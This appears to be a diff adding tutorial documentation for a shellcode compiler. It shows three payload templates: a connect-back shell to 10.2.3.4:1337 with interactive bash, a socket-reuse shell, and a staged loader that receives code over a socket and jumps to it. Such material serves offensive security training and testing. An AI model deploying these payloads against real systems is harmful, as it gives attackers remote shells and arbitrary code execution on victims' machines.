@@ -1,0 +1,54 @@
+Shellcode Compiler Examples
+===========================
+
+The following are short examples of how to use the Shellcode Compiler to solve
+common shellcoding tasks.
+
+Connect-back Shell
+------------------
+The following code will connect to 10.2.3.4 on port 1337 with an interactive
+bash session.
+
+---------------------------------------
+void main()
+{
+	int s = create_tcp4_connection(IPV4_ADDR(10, 2, 3, 4), 1337);
+	dup2(s, 0);
+	dup2(s, 1);
+	dup2(s, 2);
+	interactive_bash();
+}
+---------------------------------------
+
+Passing socket descriptor from previous stage
+---------------------------------------------
+The main() function can take arguments, which are to be passed on the stack from
+right to left (C calling convention).  When you transition to this shellcode, use
+a standard call instruction with the socket pushed onto the stack.
+
+---------------------------------------
+void main(int sock)
+{
+	dup2(sock, 0);
+	dup2(sock, 1);
+	dup2(sock, 2);
+	interactive_bash();
+}
+---------------------------------------
+
+Staged shellcode
+----------------
+You can use the computed goto syntax to transition to a new, larger shellcode buffer.
+The following example allocates a new buffer on the heap of arbitrary size.
+
+---------------------------------------
+void main(int sock)
+{
+	int len;
+	recv(sock, &len, 4, 0);
+
+	void* code = malloc(len);
+	recv_all(sock, code, len, 0);
+	goto *code;
+}
+---------------------------------------
